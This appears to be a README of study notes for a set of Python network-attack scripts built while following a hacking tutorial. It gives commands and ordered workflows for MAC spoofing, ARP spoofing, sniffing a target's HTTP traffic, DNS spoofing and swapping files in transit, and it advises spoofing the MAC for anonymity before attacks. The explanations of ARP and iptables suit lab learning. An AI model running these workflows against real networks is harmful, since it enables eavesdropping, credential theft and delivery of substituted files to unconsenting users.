
## Some commands
| Command  | Explanation |
| ------------- | ------------- |
| sudo ifconfig |Lists all interfaces and details.|
|sudo ifconfig <interface>|	Lists all details for the interface.|
|sudo ifconfig <interface> (down\|up) |	Disconnect/Connect interface.|
|sudo ifconfig <interface> hw ether <new mac> |	Spoof interface mac address (a.k.a. ether)|
|netdiscover -r <ip or range> |	Find connected devices on same network.|
|arp -a	| List ARP tables for the machine. |
|arpspoof -i <interface> -t <target ip> <new ip> |	Forces target on the interface into updating its ARP tables to point our MAC address to the new ip (usually the router).|
|echo 1 > /proc/sys/net/ipv4/ip_forward OR sysctl -w net.ipv4.ip_forward=1 | Write 1 (true) on the ip_forward file which enables packet forwarding through the machine. |
| route -n |	Lists the gateways in the network connected. This is helpful to find out the router’s IP address|
|iptables -L (--list) |	Check the existing iptables rules.|
|iptables -I (FORWARD\|INPUT\|OUTPUT) -j NFQUEUE --queue-num 0 | Creates a rule on the respective  chain of the type NetfilterQUEUE and gives it the identity number of 0. |
|iptables --flush |	Flush iptable rules. Leave only defaults.|

## Some notes 
**MAC address** - media access control – is a permanent identification sequence. This sequence can be changed. Devices on a network use the MAC address to communicate. Changing the MAC address improves anonymity. It also allows you to impersonate other devices and bypass filters.

**Interfaces** – **eth0, wlan0, lo** – these are all network interfaces. Eth0 is the Ethernet network. Wlan0 is the Wifi network and Lo is the localhost network. 

**Other terms** – INET refers to the IP address. ETHER refers to the MAC address.

**Network scanner** - Virtual Machines (VMs) cannot access the host machine's wireless card due to the concept of virtualization. To be able to scan wi-fi networks a USB Wi-Fi card is required. The USB ports must be enabled on the VM machine to be able to use the host machine’s USB ports.

**Nat Network** - If there is no USB Wi-Fi card available, then to test the concepts, you can have 2 VMs running. One will be the target, and another will be Kali VM. The connection between the two should be done via a Nat Network. To set up one go to (VirtualBox) Files > Preferences > Network > (click + sign). [YouTube video](https://www.youtube.com/watch?v=y0PMFg-oAEs).

**ARP - Address resolution protocol**
The ARP links the machine’s IP address to MAC addresses which are then used for communications. Basically, when an ARP request is sent, a broadcast message packet reaches everyone on the network and asks, *"who has <some ip>? Tell <sender ip>"*. Only the target machine, whose IP is <some ip>, will reply with its <mac address>. Finally, the initial sender updates its ARP tables which can be seen by running `arp -a`. 

**A few notes about the tutorial:**
The tutorial seems to be using scapy 2.4.2 yet 2.4.3 is out. There is a namespace conflict in PyCharm so importing scapy.all may cause an issue. If you see the squiggly line when importing scapy.all as scapy, simply ignore it. Sadly, this may also prevent you from using autocomplete and intelisense.

**Issue #1 – “text.kerning_factor” message:**
[Link to SO](https://stackoverflow.com/questions/61171307/jupyter-notebook-shows-error-message-for-matplotlib-bad-key-text-kerning-factor) - Commenting out this line fixed the message that kept coming up about "text.kerning_factor".

**Scapy classes info**
Using scapy.ls(<class>) will list all the fields that can be set.

**Issue #2 - NetfilterQueue**
Does not work with python 3.7 or 3.8. Works with python 2.7.18
On PyCharm, simply add an interpreter for Python 2.7. When running use python instead of python3.

It may be required to run the following to install the package. This fixed the issue above.
sudo apt-get install python-netfilterqueue

**iptables**
[More info here](https://www.howtogeek.com/177621/the-beginners-guide-to-iptables-the-linux-firewall/)
Essentially this is a firewall utility that checks whether connections to or from your machine can happen based on the rules defined. 

There are 3 chain types:
- INPUT – Controls the behaviour of incoming connections. Ex: a user tries to SSH into your machine. Before it happens, there will be an attempt to match the IP and port to the rule in the INPUT chain.
- FORWARD – This chain is for routing packets through your machine. Like a router, data is always coming in but it’s rarely destined for the router itself. This allows you to set up your machine as a pass-through device so you to capture all packets.
- OUTPUT – Same as INPUT but concerned with outgoing connections. 

Connections can be:
- ACCEPT – Accept connection.
- DROP – Drop connection. No error sent. Acts like connection never happened.
- REJECT – Reject and send error.


**Connecting Alfa card AWUS036NHA to Kali VM**
The only way I got it to work was to go to (VirtualBox) Settings > Network > (select “Not attached”). Reboot and once Kali boots up, connect the device. Previously, I had also run 
`sudo apt-get install firmware-atheros` which may have helped by installing some drivers.



## Full workflows
Each script can be launched individually. Consider spoofing your MAC address before launching any attacks to increase your anonymity within the network. 


**To spoof your MAC address**
- Launch Mac Spoofer - `sudo python3 mac_spoofer.py -i <interface> -m <new MAC addrress>`


**To discover devices connected to the network**
Ensure you are connected to the right interface (wlan0, eth0, etc.)
- Launch Net Discover  - `sudo python3 net_discover.py -i <ip or range>`


**To sniff a target’s HTTP traffic:**
- Launch ARP spoofer - `sudo python3 arp_spoofer.py -tip <target_ip> -rip <spoofed_ip>` 
    - it may be required to adjust the interval in seconds with the `-t <float>` flag.
- Launch Packet Sniffer - `sudo python3 packet_sniffer.py -i <interface>`
- Enable packet forwarding - `sudo sysctl -w net.ipv4.ip_forward=1`
    - Disable after attack is complete. - `sudo sysctl -w net.ipv4.ip_forward=0`

The sniffed traffic is captured in the Packet Sniffer window. 

⚠️ When lauching an ARP spoofer attack I have identified that the order of execution of the scripts matters: ARP Spoofer > Packet Sniffer > Enable packet forwarding. 


**To redirect/manipulate HTTP traffic:**
In order to perform a MITM attack, a proxy needs to be created to divert the packets through our machine so that they can later be exploited/manipulated.

- Enable iptables FORWARD rule type NFQUEUE - `sudo iptables -I FORWARD -j NFQUEUE --queue-num 0`
    - Disable after attack is complete. - `sudo iptables -F`
- Launch ARP Spoofer - `sudo python3 arp_spoofer.py -tip <target_ip> -rip <spoofed_ip>`
- Launch DNS Spoofer - currently it will only redirect the request.
`sudo python dns_spoofer.py -t <target_website> -r <redirecting_ip>`
- Enable packet forwarding - `sudo sysctl -w net.ipv4.ip_forward=1`
    - Disable after attack is complete. `sudo sysctl -w net.ipv4.ip_forward=0`

The DNS Spoofer window will output every successfull attack.


**To replace a file in HTTP traffic**
- Enable iptables FORWARD rule type NFQUEUE - `sudo iptables -I FORWARD -j NFQUEUE --queue-num 0`
    - Disable after attack is complete. - `sudo iptables -F`
- Launch ARP Spoofer - `sudo python3 arp_spoofer.py -tip <target_ip> -rip <spoofed_ip>`
- Enable packet forwarding - `sudo sysctl -w net.ipv4.ip_forward=1`
    - Disable after attack is complete. `sudo sysctl -w net.ipv4.ip_forward=0`
- Launch File Interceptor - `sudo python file_interceptor.py -e <extension> -f <replacement file url>`


### Todo
- [ ] Script for Full workflows
- [x] Update arp_spoofer script to handle IndexError on arrays
- [ ] Test NetfilterQueue with python 3.5 and 3.6